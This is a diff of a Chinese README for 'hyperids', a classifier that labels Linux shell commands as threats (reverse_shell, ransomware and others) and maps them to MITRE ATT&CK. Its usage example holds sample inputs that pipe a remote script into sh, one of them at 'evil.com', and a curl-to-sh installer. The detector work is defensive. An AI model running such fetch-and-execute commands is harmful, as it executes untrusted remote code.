@@ -5,7 +5,7 @@ Linux shell 命令威胁分类器。给定一条 shell 命令，输出：
 - **action**（多标签 28 类）：download、reverse_shell、ransomware …
 - **MITRE** tactic/technique：由 action 规则表确定性推导
 
-模型 = GLiClass 框架 + `prajjwal1/bert-small`（29.8M，≤30M）；部署为**静态单二进制**（RSS ~38 MiB）。
+模型 = GLiClass 框架 + `prajjwal1/bert-small`（29.8M，≤30M）；主发布为 **Rust + ONNX Runtime INT8 静态内嵌单二进制**（模型/词表内嵌，无 Python / 无 `libonnxruntime.so`）。
 
 ## 目录结构
 
@@ -37,10 +37,11 @@ make train && make eval && make export && make release
 
 ```bash
 curl -fsSL https://github.com/ohmydevelop/hyperids/releases/latest/download/install.sh | sh
-hyperids 'curl http://evil.com/x.sh | sh'
+hyperids 'curl -s http://example.com/x.sh | sh'
 ```
 
-详见 `deploy/c_runtime/README.md` 与 `docs/TRAINING.md`。
+支持 macOS x86_64/aarch64 与 Linux x86_64/aarch64。详见 `deploy/ort_rust_demo/README.md`。
+旧 C 运行时保留在 `deploy/c_runtime/`（legacy）。
 
 ## MITRE ATT&CK 覆盖
 
@@ -92,9 +93,8 @@ command_and_control、exfiltration、impact。
 |---|---|
 | 参数量 | **17.6M**（词表裁剪，≤30M） |
 | INT8 权重 | **17.6MB**（per-channel int8，2D 量化 / 1D fp32） |
-| C 单二进制（per-channel int8） | **~18.4MB**（静态链接） |
-| C 运行时峰值 RSS | **~27 MiB**（<100MB） |
-| 推理速度 | ~280 ms/条（AVX2+FMA，CPU） |
+| Rust 单二进制（ONNX Runtime INT8，模型内嵌） | **~46MB**（Linux x86_64 可 `crt-static`，无外部模型/权重） |
+| 推理速度 | 本机 8 线程 ~8.1 ms/条（seq=256，模型前向） |
 
 此外（v1.3.0 对抗修复）：
 - 严格 malicious Recall **95.86%**（≥95% 门槛）
